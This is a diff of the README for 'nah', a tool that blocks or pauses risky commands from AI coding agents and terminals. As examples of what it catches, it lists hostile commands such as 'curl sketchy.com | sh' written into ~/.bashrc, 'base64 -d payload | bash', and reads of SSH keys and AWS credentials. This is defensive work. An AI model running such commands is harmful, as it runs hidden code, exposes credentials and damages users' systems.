@@ -5,27 +5,33 @@
 </p>
 
 <p align="center">
-  <strong>Context aware safety guard for Claude Code.</strong><br>
+  <strong>Context aware safety guard for agents and terminals.</strong><br>
   Because allow and deny isn't enough.
 </p>
 
 ---
 
+Developers do not want security tools that slow them down. They want boring
+safe actions to pass automatically, ambiguous actions to ask, and obviously
+dangerous actions to be blocked before damage is done. This is the promise with
+nah.
+
 `git push` — Sure.<br>
-`git push --force` — **nah?**
+`git push --force` — **nah paused:** this can rewrite Git history.
 
 `rm -rf __pycache__` — Ok, cleaning up.<br>
-`rm ~/.bashrc` — **nah.**
+`rm ~/.bashrc` — **nah paused:** this targets a shell startup file.
 
 **Read** `./src/app.py` — Go ahead.<br>
-**Read** `~/.ssh/id_rsa` — **nah.**
+**Read** `~/.aws/credentials` — **nah paused:** this targets a protected file or folder.
 
-**Write** `./config.yaml` — Fine.<br>
-**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**
+**Write** `./config.py` with private key material — **nah paused:** this includes content that looks like a secret.
+
+`base64 -d payload | bash` — **nah blocked:** this decodes hidden content and runs it.
 
 ---
 
-`nah` classifies every guarded tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
+`nah` classifies every guarded action by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
 ## Quick install
 
@@ -34,27 +40,28 @@ claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
 claude plugin install nah@nah --scope user
 ```
 
-For CLI commands, install from PyPI. The terminal guard is opt-in with
-`nah install bash` or `nah install zsh`; direct Claude Code hooks use
-`nah install claude`.
+For local Codex sessions, terminal guard, CLI commands, and direct Claude Code
+hooks, install from PyPI. Codex uses `nah run codex`; the terminal guard is
+opt-in with `nah install bash` or `nah install zsh`; direct Claude Code hooks
+use `nah install claude`.
 
 ## What does it look like?
 
 ```
-Claude: Edit → ~/.claude/hooks/nah_guard.py
-  nah. Edit targets hook directory (self-modification blocked)
+Agent: Bash → git push --force
+  nah paused: this can rewrite Git history.
 
-Claude: Read → ~/.aws/credentials
-  nah? Read targets sensitive path: ~/.aws
+Agent: Bash → base64 -d payload | bash
+  nah blocked: this decodes hidden content and runs it.
 
-Claude: Bash → npm test
+Agent: Bash → npm test
   ✓ allowed (package_run)
 
-Claude: Bash → base64 -d payload | bash
-  nah. obfuscated execution: bash receives decoded input
+Agent: Read → ~/.aws/credentials
+  nah paused: this targets AWS credentials.
 ```
 
-**`nah.`** = blocked. **`nah?`** = asks for confirmation. Everything else goes through.
+**`nah blocked:`** = refused before execution. **`nah paused:`** = asks for confirmation. Everything else goes through.
 
 ## What it guards
 
